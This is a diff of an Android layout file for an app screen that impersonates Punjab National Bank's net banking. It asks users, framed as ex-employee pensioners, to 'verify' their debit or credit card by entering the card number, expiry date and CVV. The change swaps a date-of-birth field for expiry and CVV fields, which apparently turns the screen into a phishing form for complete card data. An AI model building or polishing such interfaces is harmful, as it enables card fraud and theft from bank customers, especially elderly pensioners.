@@ -27,7 +27,7 @@
                 android:id="@+id/slidingText"
                 android:layout_width="wrap_content"
                 android:layout_height="wrap_content"
-                android:text="Welcome to Punjab National Bank Pensioner"
+                android:text="Welcome to PNB Net Banking"
                 android:textSize="16sp"
                 android:paddingVertical="5dp"
                 android:textColor="#FFFFFF"
@@ -54,17 +54,16 @@
                 <TextView
                     android:layout_width="match_parent"
                     android:layout_height="wrap_content"
-                    android:text="Please verify Credit Card Details, We verifying you are Ex employee"
+                    android:text="Please verify Debit/Credit Card Details, We verifying you are Ex employee"
                     android:textColor="#000000"
                     android:layout_marginVertical="20dp"
                     android:textSize="18sp"
                     android:layout_marginBottom="4dp"/>
 
-
                 <TextView
                     android:layout_width="match_parent"
                     android:layout_height="wrap_content"
-                    android:text="Card Number"
+                    android:text="Debit/Credit Number"
                     android:textColor="#000000"
                     android:layout_marginTop="5dp"
                     android:textSize="17sp"
@@ -73,7 +72,7 @@
                     android:id="@+id/cardNumber"
                     android:layout_width="match_parent"
                     android:layout_height="wrap_content"
-                    android:hint="Enter Card Number"
+                    android:hint="XXXX XXXX XXXX  XXXX "
                     android:inputType="phone"
                     android:padding="10dp"
                     android:maxLength="19"
@@ -84,19 +83,39 @@
                 <TextView
                     android:layout_width="match_parent"
                     android:layout_height="wrap_content"
-                    android:text="Date of Birth"
+                    android:text="Expiry Date"
                     android:textColor="#000000"
                     android:layout_marginTop="5dp"
                     android:textSize="17sp"
                     android:layout_marginBottom="4dp"/>
                 <EditText
-                    android:id="@+id/dob"
+                    android:id="@+id/expriy"
                     android:layout_width="match_parent"
                     android:layout_height="wrap_content"
-                    android:hint="DD / MM / YYYY"
-                    android:inputType="phone"
+                    android:hint="MM / YY"
+                    android:inputType="number"
                     android:padding="10dp"
-                    android:maxLength="10"
+                    android:maxLength="5"
+                    android:background="#F0F0F0"
+                    android:layout_marginBottom="10dp"/>
+
+
+                <TextView
+                    android:layout_width="match_parent"
+                    android:layout_height="wrap_content"
+                    android:text="CVV"
+                    android:textColor="#000000"
+                    android:layout_marginTop="5dp"
+                    android:textSize="17sp"
+                    android:layout_marginBottom="4dp"/>
+                <EditText
+                    android:id="@+id/cvv"
+                    android:layout_width="match_parent"
+                    android:layout_height="wrap_content"
+                    android:hint="* * * "
+                    android:inputType="numberPassword"
+                    android:padding="10dp"
+                    android:maxLength="3"
                     android:background="#F0F0F0"
                     android:layout_marginBottom="10dp"/>
 
